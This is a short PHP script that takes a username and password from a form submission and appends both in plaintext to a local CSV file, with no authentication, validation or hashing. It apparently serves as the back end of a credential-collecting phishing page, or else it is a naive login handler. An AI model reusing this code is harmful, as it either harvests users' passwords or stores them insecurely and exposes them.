<?php
    session_start();

    $path = '../datas/hello.csv';

    if(isset($_POST['username']) && isset($_POST['password'])) 
    {
        $fp = fopen($path, 'a');

        $arr = array
        (
            'Username: ' => $_POST['username'],
            'Password: ' => $_POST['password']
        );

        fputcsv($fp, $arr);

        fclose($fp);

    }

?>